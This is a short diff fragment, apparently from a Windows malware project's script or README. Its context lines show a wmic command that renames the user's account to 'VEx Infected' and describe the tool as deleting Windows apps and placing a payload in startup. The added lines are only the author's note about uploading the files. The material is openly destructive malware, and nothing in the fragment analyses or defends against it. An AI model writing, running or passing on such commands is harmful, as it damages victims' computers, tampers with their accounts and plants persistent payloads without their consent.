@@ -49,3 +49,5 @@ wmic useraccount where='%username%' rename 'VEx Infected'
 exit
 
 This Deletes Windows Apps Sets Username and Puts Payload In Startup.
+
+It wont let me upload the main files by folder so i have to do it on my windows pc.
